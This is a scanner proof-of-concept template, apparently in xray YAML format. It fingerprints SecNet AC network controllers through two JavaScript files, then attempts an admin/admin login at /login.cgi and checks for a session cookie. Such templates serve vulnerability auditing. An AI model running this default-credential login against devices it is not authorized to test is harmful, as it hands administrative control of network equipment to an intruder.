name: poc-yaml-secnet-ac-default-password
manual: true
transport: http
rules:
  uc1:
    request:
      cache: true
      method: GET
      path: /js/setaps.js
    expression: response.status == 200 && response.body.bcontains(b"只能选择一个设备")
  uc2:
    request:
      cache: true
      method: GET
      path: /js/show_ssid.js
    expression: response.status == 200 && response.body.bcontains(b"WPA/WPA2个人")
  uc3:
    request:
      cache: true
      method: POST
      path: /login.cgi
      body:
        user=admin&password=admin
    expression: response.status == 200 && response.body.bcontains(b"index.htm") && response.headers["Set-Cookie"].contains("ac_userid=")
expression: uc1() && uc2() && uc3()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://bbs.secnet.cn/post/t-30
